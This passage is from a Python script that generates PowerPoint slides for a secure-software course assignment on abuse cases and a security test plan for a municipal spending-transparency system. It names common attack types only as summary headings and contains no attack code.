            ca_obj = next((c for c in CASOS_ABUSO if c["id"] == prueba["ca"]), {})
            risk_color = COLORES_RIESGO.get(ca_obj.get("riesgo", "MEDIO"), GRIS_MED)

            rect(slide, 0.15, top, 9.7, 0.32, risk_color)
            box(slide, 0.2, top + 0.04, 7.5, 0.24,
                f"{prueba['ca']} — {ca_obj.get('nombre', '')}",
                size=10, bold=True, text_color=BLANCO)
            box(slide, 7.8, top + 0.04, 2.0, 0.24,
                ca_obj.get("riesgo", ""), size=10, bold=True,
                text_color=BLANCO, align=PP_ALIGN.CENTER)

            campos = [
                ("Objetivo", prueba["objetivo"]),
                ("Procedimiento", prueba["procedimiento"]),
                ("Resultado esperado", prueba["resultado_esperado"]),
                ("Criterio de éxito", prueba["criterio"]),
            ]
            y = top + 0.32
            for label, val in campos:
                h = 0.45
                rect(slide, 0.15, y, 2.1, h, GRIS_CLARO, GRIS_MED)
                box(slide, 0.2, y + 0.06, 2.0, h - 0.08, label,
                    size=8.5, bold=True, text_color=AZUL_ODS)
                rect(slide, 2.25, y, 7.6, h, BLANCO, GRIS_MED)
                box(slide, 2.3, y + 0.04, 7.5, h - 0.06, val,
                    size=8.5, text_color=GRIS_OSCURO)
                y += h

        rect(slide, 0, 5.45, 10, 0.07, GRIS_OSCURO)


# ─────────────────────────────────────────────────────────────────────────────
# Slide final: Conclusiones
# ─────────────────────────────────────────────────────────────────────────────
def slide_conclusiones(prs):
    slide = add_slide(prs, 6)
    set_bg(slide, AZUL_ODS)

    rect(slide, 0, 0, 10, 0.75, AZUL_CLARO)
    box(slide, 0.3, 0.1, 9.4, 0.55,
        "Conclusiones y Próximos Pasos",
        size=20, bold=True, text_color=BLANCO, align=PP_ALIGN.CENTER)

    items = [
        ("10 Requisitos de Seguridad",
         "Cubriendo autenticación, cifrado, trazabilidad, disponibilidad, validación e integridad de datos."),
        ("10 Casos de Abuso identificados",
         "Desde amenazas internas (funcionario malicioso) hasta ataques externos (DDoS, SQLi, XSS, IDOR, Defacement)."),
        ("3 Casos Críticos priorizados",
         "CA-01 (Manipulación interna), CA-02 (DDoS electoral) y CA-05 (Phishing de funcionario) requieren mitigación inmediata."),
        ("Plan de Pruebas de Seguridad",
         "10 pruebas específicas con procedimiento, resultado esperado y criterio de éxito verificable."),
        ("Principio aplicado",
         "Think like an attacker: modelar amenazas desde la perspectiva ofensiva para fortalecer las defensas antes del despliegue."),
    ]

    y = 0.9
    for titulo, desc in items:
        rect(slide, 0.3, y, 0.08, 0.5, AMARILLO)
        box(slide, 0.5, y, 9.0, 0.28, titulo, size=12, bold=True, text_color=AMARILLO)
        box(slide, 0.5, y + 0.28, 9.0, 0.28, desc, size=10, text_color=GRIS_CLARO)
        y += 0.72

    rect(slide, 1.0, 4.8, 8.0, 0.04, AMARILLO)
    box(slide, 0.5, 4.9, 9.0, 0.3,
        "Un sistema de transparencia solo es confiable si su seguridad es robusta.",
        size=12, bold=True, text_color=BLANCO, align=PP_ALIGN.CENTER, italic=True)
    box(slide, 0.5, 5.2, 9.0, 0.25,
        "GastoTransparente Municipal — ODS 16 — Software Seguro 2026",
        size=10, text_color=GRIS_CLARO, align=PP_ALIGN.CENTER)


# ─────────────────────────────────────────────────────────────────────────────
# Main
# ─────────────────────────────────────────────────────────────────────────────
def main():
    prs = Presentation()
    prs.slide_width  = Inches(10)
    prs.slide_height = Inches(5.625)

    slide_portada(prs)
    slide_contexto(prs)
    slide_requisitos(prs)

    for idx, caso in enumerate(CASOS_ABUSO, start=1):
        slide_caso_abuso(prs, caso, idx)

    slides_pruebas(prs)
    slide_conclusiones(prs)

    out = r"C:\Users\cuent\Documents\Universidad\2026-02\Soft Seguro\Guia 4\CasosDeAbuso_GastoTransparente_ODS16.pptx"
    prs.save(out)
    print(f"[OK] Presentación guardada: {out}")
    print(f"     Slides generados: {len(prs.slides)}")


if __name__ == "__main__":
    main()
